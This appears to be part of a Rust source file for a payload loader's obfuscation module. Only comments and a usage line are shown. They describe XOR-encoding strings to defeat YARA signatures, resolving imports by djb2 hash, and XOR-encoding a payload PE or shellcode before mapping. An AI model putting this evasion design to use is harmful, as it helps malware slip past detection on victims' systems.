...
//!
//! Goals:
//!   - Eliminate plaintext strings from the binary (kills YARA string sigs)
//!   - Replace direct import name references with djb2-hashed runtime resolution
//!   - Optionally XOR-encode the entire payload PE before mapping

// ---- Compile-time string obfuscation via const fn XOR ----------------------

/// XOR each byte of a string literal with a fixed key at compile time.
/// Usage:  const NTDLL: [u8; 9] = xor_str!("ntdll.dll", 0x5A);
...
/// Decode an XOR'd byte array back to a null-terminated C string at runtime.
/// Returns a Vec<u8> — do NOT store long-term; stack-allocate and wipe after use.
...
// ---- Import hash obfuscation ------------------------------------------------

/// djb2 hash of an ASCII string (matches utils.rs impl).
...
/// Resolve an exported function by djb2 hash — zero import name strings in binary.
/// Walk the module's EAT and compare each export name hash.
...
// ---- Payload XOR encode/decode ----------------------------------------------

/// XOR-encode a raw PE/shellcode buffer in-place with a rotating key.
/// `key` should be unique per build (generated in main.rs from SLEEP_KEY entropy).
...
/// Securely wipe a buffer after use (prevents sensitive bytes lingering in heap).
